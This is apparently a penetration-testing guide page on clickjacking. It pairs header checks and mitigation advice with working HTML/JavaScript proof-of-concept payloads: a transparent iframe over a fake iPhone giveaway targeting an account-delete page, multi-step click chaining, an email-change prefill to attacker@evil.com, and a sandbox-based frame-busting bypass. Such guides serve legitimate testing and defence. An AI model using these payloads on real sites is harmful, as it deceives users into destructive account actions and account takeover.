% Filename: 04-web-testing/client-side/clickjacking.md
% Display name: Clickjacking
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1189 (Drive-by Compromise)
% Authors: @TristanInSec

# Clickjacking

## Overview

Clickjacking (UI redressing) tricks users into clicking hidden elements by overlaying a transparent iframe of the target application on top of attacker-controlled content. The victim believes they are clicking a button on the attacker's page, but they are actually clicking a button on the target application — performing actions like changing account settings, making purchases, or granting permissions.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1189 - Drive-by Compromise

## Prerequisites

- Target page can be loaded in an iframe (no `X-Frame-Options` or `frame-ancestors` CSP)
- Target page contains clickable actions that are valuable to the attacker (state-changing buttons, toggles, confirmation dialogs)
- Victim must be authenticated on the target application

## Detection Methodology

### Testing for Clickjacking Vulnerability

**Step 1 — Check response headers:**

```bash
# Check for X-Frame-Options and CSP frame-ancestors
curl -s -I http://target.com/account/settings | grep -iE "x-frame-options|content-security-policy"
```

Expected safe responses:
```text
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors 'none'
```

If neither header is present, the page is likely frameable.

**Step 2 — Attempt to frame the page:**

```html
<html>
<head><title>Clickjacking Test</title></head>
<body>
<h1>Clickjacking PoC</h1>
<iframe src="http://target.com/account/settings" width="800" height="600"></iframe>
</body>
</html>
```

If the target page renders inside the iframe, it is vulnerable.

### What to Check

- Pages with state-changing actions (settings, profile, permissions)
- OAuth authorization pages (grant access buttons)
- Payment confirmation pages
- Admin panels
- "Delete account" or "change email" pages
- One-click purchase buttons

## Techniques

### Basic Clickjacking

Overlay the target iframe transparently on top of a decoy page:

```html
<html>
<head>
<style>
  #target {
    position: absolute;
    top: 0; left: 0;
    width: 800px;
    height: 600px;
    opacity: 0.0001;     /* Nearly invisible */
    z-index: 2;          /* On top */
  }
  #decoy {
    position: absolute;
    top: 0; left: 0;
    z-index: 1;          /* Behind the iframe */
  }
</style>
</head>
<body>
<div id="decoy">
  <h1>Win a Free iPhone!</h1>
  <button style="position:absolute; top:350px; left:200px; font-size:24px;">
    Click Here to Claim!
  </button>
</div>
<iframe id="target" src="http://target.com/account/delete"></iframe>
</body>
</html>
```

The victim clicks "Claim" but actually clicks the delete button on the target page beneath.

### Multi-Step Clickjacking

Some actions require multiple clicks (e.g., "Delete account" → "Are you sure?" confirmation). Chain multiple clicks by repositioning the iframe between steps:

```html
<html>
<head>
<style>
  #target {
    position: absolute;
    opacity: 0.0001;
    z-index: 2;
  }
</style>
</head>
<body>
<div id="decoy">
  <button id="btn1" style="position:absolute; top:350px; left:200px;">Step 1: Enter Contest</button>
  <button id="btn2" style="position:absolute; top:350px; left:200px; display:none;">Step 2: Confirm Entry</button>
</div>
<iframe id="target" src="http://target.com/account/delete" width="800" height="600"></iframe>
<script>
  document.getElementById('btn1').addEventListener('click', function() {
    // After first click lands on "Delete" button,
    // reposition iframe so second click hits "Confirm"
    document.getElementById('target').style.top = '-50px';
    document.getElementById('btn1').style.display = 'none';
    document.getElementById('btn2').style.display = 'block';
  });
</script>
</body>
</html>
```

### Clickjacking with Form Prefill

Combine clickjacking with pre-filled form fields using URL parameters (if the target supports them):

```html
<iframe src="http://target.com/account/email?new_email=attacker@evil.com"
  style="opacity:0.0001; position:absolute; z-index:2;"
  width="800" height="600">
</iframe>
```

The victim clicks what appears to be a decoy button, but actually submits a pre-filled form changing their email.

### Clickjacking with Drag-and-Drop

Some applications require drag-and-drop interactions (e.g., file uploads, permission grants). Use HTML5 drag-and-drop events to redirect the victim's drag action into the target iframe:

```html
<div id="drag-source" draggable="true" ondragstart="event.dataTransfer.setData('text/plain','attacker_data')">
  Drag this prize to the box below!
</div>
<iframe src="http://target.com/upload" style="opacity:0.0001; position:absolute;"
  width="800" height="600">
</iframe>
```

### Frame-Busting Bypass

Some applications use JavaScript frame-busting to prevent framing:

```javascript
// Common frame-busting code
if (top !== self) { top.location = self.location; }
```

**Bypass with sandbox attribute:**

```html
<!-- sandbox prevents the iframe from navigating the top window -->
<iframe src="http://target.com/settings"
  sandbox="allow-scripts allow-forms allow-same-origin"
  style="opacity:0.0001; position:absolute;"
  width="800" height="600">
</iframe>
```

The `sandbox` attribute without `allow-top-navigation` prevents the framed page from breaking out by redirecting `top.location`.

**Bypass with double framing (parent-check variant):**

```html
<!-- Outer frame (attacker's page) -->
<iframe src="attacker-inner.html"></iframe>

<!-- attacker-inner.html contains: -->
<iframe src="http://target.com/settings"></iframe>
```

Some older frame-busting scripts check `if (parent !== self)` rather than `if (top !== self)`. In double-framing, the target page's parent is the inner attacker frame (not top), so `parent !== self` is true but `top.location` redirect still points to the outer attacker page — the bust fails. This technique only works against scripts checking `parent` instead of `top`, and is unreliable. The sandbox-based bypass above is the more reliable approach.

## Detection Methods

### Network-Based Detection

- Pages missing `X-Frame-Options` or `frame-ancestors` CSP headers in responses
- Authenticated pages returning sensitive content without framing protection
- Requests with `Sec-Fetch-Dest: iframe` from unexpected referrers

### Host-Based Detection

- Audit all pages containing state-changing actions for framing headers
- Monitor CSP reports for `frame-ancestors` violations
- Review JavaScript frame-busting implementations for known bypass patterns

## Mitigation Strategies

- **`X-Frame-Options` header** — set on all pages:
  - `DENY` — page cannot be framed at all
  - `SAMEORIGIN` — page can only be framed by same-origin pages
  - Limitation: `X-Frame-Options` does not support multi-domain whitelists
- **CSP `frame-ancestors` directive** — the modern replacement for `X-Frame-Options`. More flexible and supports multiple origins:
  - `frame-ancestors 'none'` — equivalent to `DENY`
  - `frame-ancestors 'self'` — equivalent to `SAMEORIGIN`
  - `frame-ancestors 'self' https://trusted.com` — allows specific origins
- **Use both headers** — `X-Frame-Options` for older browser compatibility and `frame-ancestors` for modern browsers. When both are present, `frame-ancestors` takes precedence in supporting browsers
- **SameSite cookies** — `SameSite=Strict` or `SameSite=Lax` prevents cookies from being sent in framed cross-site contexts, making clickjacking attacks ineffective even if framing is possible (the user won't be authenticated in the frame)
- **Avoid JavaScript frame-busting as sole defense** — frame-busting scripts are bypassable via `sandbox` attribute. Use HTTP headers as the primary defense

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP - Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)
- [OWASP - Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)

### Official Documentation

- [MDN - X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN - CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### MITRE ATT&CK

- [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
